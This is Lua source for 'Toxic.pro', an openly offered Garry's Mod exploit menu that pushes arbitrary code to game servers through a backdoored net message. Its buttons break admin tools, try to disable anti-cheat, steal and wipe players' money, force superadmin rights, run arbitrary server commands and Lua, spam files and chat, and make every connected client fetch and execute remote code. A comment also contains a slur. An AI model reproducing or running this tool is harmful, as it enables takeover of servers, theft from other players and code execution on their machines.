/*
   
    Toxic.pro
   
    Start Date: December 27th, 2017.
   
    First revision finished December 28th, 2017 @ 3:28AM.
   
*/
 
local toxic = {}

toxic.Net = "fix" -- backdoored net message
 
/*
   
    Backend functions
   
*/
 
function toxic.PostLua( str )
 
    net.Start( toxic.Net )
   
        net.WriteString( str )
       
    net.SendToServer()
 
end
 
function toxic.Notify( msg )
 
    chat.AddText( Color( 255, 0, 0 ), "[Toxic.pro] ", color_white, msg )
 
end
 
/*
   
    Backdoor functions
   
*/
 
function toxic.DumpsterULX()
 
    toxic.PostLua( [[ _G.ulx = function() end _G.ULib = function() end ]])
 
    toxic.Notify( "Broke ULX, admins now have no control." )
   
end
 
function toxic.SorryCake()
 
    toxic.PostLua( [[ _G.cac = function() end]] )
   
    toxic.Notify( "Attempted to disable !cake's anti-cheat, probably failed." )
 
end
 
function toxic.TakeMoney()
 
    toxic.PostLua( [[
   
        local id = ]] .. LocalPlayer():UserID() .. [[
 
        for k, v in next, player.GetAll() do
           
            if v:Nick() == "]] .. LocalPlayer():Nick() .. [[" then
           
                continue
           
            end
           
            local bal = v:getDarkRPVar( "money" ) or 9999999
           
            v:addMoney( -bal )
           
            Player( id ):addMoney( bal )
           
            Player( id ):ChatPrint( "[Toxic.pro] Stole $" .. string.Comma( bal ) .. " from " .. v:Nick() )
           
        end
   
    ]] )
 
end
 
function toxic.Rape()
 
    -- I don't like this.
    toxic.PostLua( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[sound.PlayURL( 'http://riverrp.xyz/earbutt.mp3', 'mono', function( s ) s:Play() end )]] ) end" )
   
    -- I don't like any of this.
    toxic.PostLua( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[http.Fetch( '	', function( body ) RunString( body ) end )]] ) end" )
   
end
 
/*
   
    user interface
   
*/
 
function toxic.AddButton( name, parent, func )
 
    local button = parent:Add( "DButton" )
    button:SetText( "" )
    button:Dock( TOP )
    button:DockMargin( 0, 0, 0, 5 )
    button:SetSize( 100, 25 )
    button.DoClick = func
   
    button.Paint = function( self )
   
        draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 0, 0, 0, 200 ) )
       
        draw.SimpleText( name, "DebugFixed", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1 )
   
    end
 
    toxic.ButtonPos = toxic.ButtonPos + 30
   
end
 
// use DSCrollPanel faggot
 
function toxic.UI()
   
    toxic.ButtonPos = 30
   
    local frame = vgui.Create( "DFrame" )
    frame:SetTitle( "Toxic.pro" )
    frame:SetSize( 400, 250 )
    frame:Center()
    frame:MakePopup()
    frame:ShowCloseButton( false )
   
    frame.Paint = function( self )
       
        draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 140, 0, 0, 150 ) )
       
        draw.RoundedBox( 0, 0, 0, self:GetWide(), 25, Color( 0, 0, 0, 200 ) )
       
    end
   
    local close = vgui.Create( "DButton", frame )
    close:SetSize( 50, 20 )
    close:SetPos( frame:GetWide() - 50, 0 )
    close:SetText( "x" )
    close:SetTextColor( Color( 255, 255, 255 ) )
    close:SetFont( "DebugFixed" )
   
    close.Paint = function()
   
        draw.RoundedBox( 0, 0, 0, close:GetWide(), close:GetTall(), Color( 168, 62, 62, 255 ) )
   
    end
   
    close.DoClick = function()
       
        frame:Close()
       
    end
   
    local panel = vgui.Create( "DScrollPanel", frame )
    panel:SetPos( 5, 30 )
    panel:SetSize( 150, frame:GetTall() - 35 )
   
    local html = vgui.Create( "HTML", frame )
    html:SetPos( panel:GetWide() + 20, 30 )
    html:SetSize( 240, 215 )
    html:SetHTML( [[
        <img src="http://www.clker.com/cliparts/c/e/8/f/12387015421849960016GameFreak7744_Biohazard_symbol.svg.med.png" alt="Img" style="width:200px;height:195px;">
    ]] )
   
    toxic.AddButton( "Break ULX", panel, toxic.DumpsterULX )
    toxic.AddButton( "Disable !cake", panel, toxic.SorryCake )
    toxic.AddButton( "Steal Money", panel, toxic.TakeMoney )
    toxic.AddButton( "Wipe All Money", panel, function()
   
        toxic.PostLua( [[RunConsoleCommand( "rp_resetallmoney" )]] )
 
        toxic.Notify( "Wiped DarkRP money database" )
       
    end )
   
    toxic.AddButton( "Visual Rape", panel, toxic.Rape )
   
    toxic.AddButton( "Earthquake", panel, function()
 
        toxic.PostLua( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end" )
       
        toxic.Notify( "Earthquake started." )
       
    end )
   
    toxic.AddButton( "Spam .txt", panel, function()
       
        Derma_StringRequest( ".txt file contents", "What would you like to put in the .txt?", "", function( text )
           
            toxic.PostLua( [[
       
                for i = 1, 100 do
           
                    file.Write( "toxic.pro_" .. math.random( 1, 999999 ) .. ".txt", "]] .. text .. [[" )
           
                end
           
            ]] )
   
            toxic.Notify( "Spamming 100 .txt files containing '" .. text .. "'" )
   
        end )
       
    end )
   
    toxic.AddButton( "Spam Chat", panel, function()
       
        Derma_StringRequest( "Message", "Chat Message", "", function( text )
           
            toxic.PostLua( [[
               
                util.AddNetworkString("chat_AddText")
                chat = {}
                function chat.AddText(...)
                    net.Start("chat_AddText")
                        net.WriteTable({...})
                    net.Broadcast()
                end
                function AddTextPly( ply, ...)
                    net.Start("chat_AddText")
                        net.WriteTable({...})
                    net.Send( ply )
                end
               
                for k, v in pairs( player.GetAll() ) do
               
                    v:SendLua( 'net.Receive("chat_AddText", function(len) chat.AddText( unpack( net.ReadTable() ) )end)' )
               
                end
               
                timer.Create( "gotEm", 1, 120, function()
               
                    local function ChatPrintRainbow( frequency, str )
 
                        local text = {}
 
 
                        for i = 1, #str do
                            table.insert( text, HSVToColor( i * frequency % 360, 1, 1 ) )
                        table.insert( text, string.sub( str, i, i ) )
                        end
 
                        chat.AddText( unpack( text ) )
 
                    end
                   
                    ChatPrintRainbow( 10, "]] .. text .. [[" )
               
                end )
 
           
            ]] )
 
        end )
       
    end )
   
    toxic.AddButton( "Give Superadmin", panel, function()
       
        toxic.PostLua( [[
       
            local id = ]] .. LocalPlayer():UserID() .. [[
           
            RunConsoleCommand( 'ulx', 'adduser', tostring( Player( id ):Nick() ), 'superadmin' )
           
            Player( id ):SetUserGroup( "superadmin" )
       
        ]] )
       
        toxic.Notify( "Attempted to force superadmin." )
   
    end )
   
    toxic.AddButton( "RCON", panel, function()
   
        Derma_StringRequest( "Toxic.pro RCON", "Command", "", function( text )
           
            toxic.PostLua( [[game.ConsoleCommand( "]] .. tostring( text ) .. [[" .. "\n" )]] )
           
            toxic.Notify( "Ran command '" .. text .. "'" )
           
        end )
   
    end )
   
    toxic.AddButton( "Lua Run", panel, function()
   
        Derma_StringRequest( "Toxic.pro Lua Run", "Command", "", function( text )
           
            toxic.PostLua( [[RunString( ']] .. text .. [[' )]] )
           
            toxic.Notify( "Ran Lua '" .. text .. "'" )
           
        end )
   
    end )
   
    toxic.AddButton( "Rename Server", panel, function()
   
        toxic.PostLua( [[RunConsoleCommand( "hostname", "TOXIC.PRO" )]] )
       
        toxic.Notify( "Renamed server to TOXIC.PRO" )
   
    end )
   
end
 
concommand.Add( "toxic.pro", toxic.UI )